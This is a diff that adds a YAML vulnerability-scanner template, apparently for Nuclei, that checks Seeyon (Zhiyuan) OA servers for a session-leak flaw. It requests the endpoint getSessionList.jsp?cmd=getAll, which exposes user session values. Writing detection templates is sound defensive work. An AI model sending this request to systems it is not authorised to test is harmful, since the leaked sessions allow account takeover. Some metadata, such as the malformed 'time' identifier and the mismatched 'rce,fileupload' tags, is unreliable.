@@ -1,0 +1,33 @@
+id: 致远SESSION泄漏漏洞
+time: "2020-17519"
+
+info:
+  severity: critical
+  description: 通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况
+  remediation: Apply the appropriate patch.
+  tags: zhiyuan,rce,fileupload,seeyon,intrusive
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "1"
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/02/04
